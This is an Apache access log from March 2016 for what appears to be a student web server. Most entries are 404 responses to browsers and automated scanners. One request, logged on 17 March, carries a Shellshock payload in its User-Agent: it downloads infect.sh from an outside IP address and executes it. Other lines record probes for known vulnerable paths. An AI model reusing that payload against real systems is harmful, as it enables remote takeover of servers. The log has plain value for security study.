86.111.247.39 - - [15/Mar/2016:14:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
193.190.65.65 - - [15/Mar/2016:15:09:44 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:09:46 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:09:47 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:09:47 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:09:47 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:09:48 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:09:48 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:09:49 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:09:59 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:10:00 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:10:00 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:10:00 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:10:00 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:10:01 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:13:46 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:13:47 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:13:47 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:13:49 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:13:50 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:13:50 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:13:50 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:13:53 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:14:59 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:15:04 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:15:07 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
193.190.65.65 - - [15/Mar/2016:15:15:11 +0000] "GET /www/ HTTP/1.1" 404 418 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
86.111.247.39 - - [15/Mar/2016:16:39:02 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
62.141.36.174 - - [15/Mar/2016:18:28:57 +0000] "GET /w00tw00t.at.ISC.SANS.Win32:) HTTP/1.1" 400 0 "-" "-"
86.111.247.39 - - [15/Mar/2016:18:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [15/Mar/2016:20:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.200.66 - - [15/Mar/2016:21:41:48 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.200.66 - - [15/Mar/2016:21:41:48 +0000] "GET /favicon.ico HTTP/1.1" 404 426 "http://51.255.42.209/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.200.66 - - [15/Mar/2016:21:42:42 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.200.66 - - [15/Mar/2016:22:31:23 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.200.66 - - [15/Mar/2016:22:31:24 +0000] "GET /favicon.ico HTTP/1.1" 404 426 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.200.66 - - [15/Mar/2016:22:31:24 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 447 "-" "Safari/11601.4.4 CFNetwork/760.2.6 Darwin/15.3.0 (x86_64)"
149.154.200.66 - - [15/Mar/2016:22:31:24 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 434 "-" "Safari/11601.4.4 CFNetwork/760.2.6 Darwin/15.3.0 (x86_64)"
86.111.247.39 - - [15/Mar/2016:22:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.200.66 - - [15/Mar/2016:22:46:39 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.200.66 - - [15/Mar/2016:22:46:42 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.200.66 - - [15/Mar/2016:22:47:15 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
81.245.67.206 - - [15/Mar/2016:22:50:56 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [15/Mar/2016:22:50:56 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [15/Mar/2016:22:50:56 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
149.154.200.66 - - [15/Mar/2016:22:52:33 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
81.245.67.206 - - [15/Mar/2016:22:53:37 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [15/Mar/2016:22:53:42 +0000] "GET /WWW HTTP/1.1" 404 417 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
149.154.200.66 - - [15/Mar/2016:22:56:14 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
81.245.67.206 - - [15/Mar/2016:23:05:01 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [15/Mar/2016:23:05:01 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [15/Mar/2016:23:05:01 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
149.154.200.66 - - [15/Mar/2016:23:08:58 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.200.66 - - [15/Mar/2016:23:09:08 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.200.66 - - [15/Mar/2016:23:29:37 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
86.111.247.39 - - [16/Mar/2016:00:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [16/Mar/2016:02:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [16/Mar/2016:04:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [16/Mar/2016:06:39:02 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.195.2 - - [16/Mar/2016:07:51:52 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.195.2 - - [16/Mar/2016:08:19:00 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.195.2 - - [16/Mar/2016:08:27:36 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.195.2 - - [16/Mar/2016:08:27:43 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.195.2 - - [16/Mar/2016:08:31:20 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
86.111.247.39 - - [16/Mar/2016:08:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
192.99.58.36 - - [16/Mar/2016:10:24:36 +0000] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 0 "-" "-"
198.245.55.60 - - [16/Mar/2016:10:26:31 +0000] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 0 "-" "-"
86.111.247.39 - - [16/Mar/2016:10:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.195.2 - - [16/Mar/2016:11:49:02 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.195.2 - - [16/Mar/2016:11:49:07 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
86.111.247.39 - - [16/Mar/2016:12:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
81.245.67.206 - - [16/Mar/2016:12:56:33 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [16/Mar/2016:12:56:33 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [16/Mar/2016:12:56:35 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
81.245.67.206 - - [16/Mar/2016:12:56:35 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0"
86.111.247.39 - - [16/Mar/2016:14:39:04 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [16/Mar/2016:16:39:02 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.195.2 - - [16/Mar/2016:17:36:54 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
86.111.247.39 - - [16/Mar/2016:18:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
149.154.194.66 - - [16/Mar/2016:19:51:27 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
54.81.168.187 - - [16/Mar/2016:20:24:57 +0000] "HEAD / HTTP/1.1" 404 140 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
86.111.247.39 - - [16/Mar/2016:20:39:02 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [16/Mar/2016:22:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
181.214.92.100 - - [16/Mar/2016:23:30:14 +0000] "POST /xmlrpc.php HTTP/1.0" 404 388 "-" "Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0"
123.59.59.52 - - [17/Mar/2016:00:25:31 +0000] "GET http://www.mafengwo.cn/ HTTP/1.1" 404 378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
123.59.59.52 - - [17/Mar/2016:00:25:59 +0000] "GET http://www.mafengwo.cn/ HTTP/1.1" 404 378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
86.111.247.39 - - [17/Mar/2016:00:39:04 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
94.102.51.124 - - [17/Mar/2016:01:35:16 +0000] "GET / HTTP/1.1" 404 378 "-" "() { :; }; /bin/bash -c 'wget http://94.102.51.124/infect.sh -O /tmp/infect.sh; chmod +x /tmp/infect.sh; /tmp/infect.sh'"
86.111.247.39 - - [17/Mar/2016:02:39:02 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
54.159.78.53 - - [17/Mar/2016:02:56:46 +0000] "HEAD / HTTP/1.1" 404 140 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
192.99.144.140 - - [17/Mar/2016:03:57:50 +0000] "PROPFIND /webdav/ HTTP/1.1" 405 495 "-" "WEBDAV Client"
86.111.247.39 - - [17/Mar/2016:04:39:02 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
67.197.242.57 - - [17/Mar/2016:04:39:46 +0000] "GET /tmUnblock.cgi HTTP/1.1" 400 0 "-" "-"
67.197.242.57 - - [17/Mar/2016:04:39:47 +0000] "GET / HTTP/1.1" 400 0 "-" "-"
86.111.247.39 - - [17/Mar/2016:06:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [17/Mar/2016:08:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
159.203.250.214 - - [17/Mar/2016:09:33:56 +0000] "GET / HTTP/1.0" 404 378 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
83.166.234.6 - - [17/Mar/2016:09:55:18 +0000] "GET / HTTP/1.1" 404 359 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
83.166.234.6 - - [17/Mar/2016:09:55:18 +0000] "GET /HNAP1/ HTTP/1.1" 404 365 "http://51.255.42.209/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
86.111.247.39 - - [17/Mar/2016:10:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
101.227.255.195 - - [17/Mar/2016:10:46:23 +0000] "GET /script HTTP/1.1" 404 421 "-" "python-requests/2.7.0 CPython/2.7.0 Windows/2008ServerR2"
193.190.65.65 - - [17/Mar/2016:11:11:46 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:11:16:45 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:11:30:44 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:44 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 455 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:44 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 442 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:44 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 434 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:44 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 434 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:45 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 446 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:11:30:45 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
86.111.247.39 - - [17/Mar/2016:12:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
193.190.65.65 - - [17/Mar/2016:12:57:55 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:12:58:47 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:12:58:47 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:12:59:03 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
193.190.65.65 - - [17/Mar/2016:14:38:14 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
86.111.247.39 - - [17/Mar/2016:14:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
89.248.172.201 - - [17/Mar/2016:15:01:34 +0000] "GET / HTTP/1.1" 404 359 "-" "-"
193.190.65.65 - - [17/Mar/2016:16:09:30 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
66.249.93.97 - - [17/Mar/2016:16:09:42 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36"
66.249.93.89 - - [17/Mar/2016:16:09:42 +0000] "GET /favicon.ico HTTP/1.1" 404 426 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36"
193.190.65.65 - - [17/Mar/2016:16:10:27 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
193.190.65.65 - - [17/Mar/2016:16:10:40 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
86.111.247.39 - - [17/Mar/2016:16:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
86.111.247.39 - - [17/Mar/2016:18:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
89.68.13.46 - - [17/Mar/2016:20:13:32 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
89.68.13.46 - - [17/Mar/2016:20:13:32 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "http://vps224842.ovh.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"
86.111.247.39 - - [17/Mar/2016:20:39:03 +0000] "GET /dodajss.php HTTP/1.0" 404 426 "-" "Wget/1.12 (linux-gnu)"
80.200.22.14 - - [17/Mar/2016:20:39:31 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
80.200.22.14 - - [17/Mar/2016:20:39:31 +0000] "GET /favicon.ico HTTP/1.1" 404 425 "http://www.wt4.ephec-ti.be/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
149.154.208.130 - - [17/Mar/2016:20:56:44 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:28:02 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:28:07 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:28:10 +0000] "GET / HTTP/1.1" 404 414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:28:11 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
149.154.208.130 - - [17/Mar/2016:21:29:02 +0000] "GET / HTTP/1.1" 404 415 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
